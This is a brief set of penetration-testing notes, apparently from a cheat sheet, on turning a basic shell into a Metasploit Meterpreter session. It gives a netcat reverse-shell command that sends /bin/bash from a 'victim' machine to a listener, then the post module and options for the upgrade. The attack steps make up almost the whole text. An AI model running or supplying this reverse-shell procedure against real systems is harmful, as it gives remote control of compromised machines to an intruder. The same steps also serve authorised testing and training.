1. Start a listener in `Metasploit` with `multi/handler` module. If needed, modify the payload (by default `generic/shell_reverse_tcp`).
2. Gain a shell in the victim system. Then, on the victim, send the shell via `nc`: `nc <LISTENER_IP> <LISTENER_PORT> -e /bin/bash`
3. After getting a shell with the `multi/handler` module, `run post/multi/manage/shell_to_meterpreter`.
4. Set options `LHOST`, `LPORT` (same as the generic shell) and the `SESSION`.
5. Run the module. A new meterpreter session should start. m 

> Usually, no root shell is needed to perform this operations.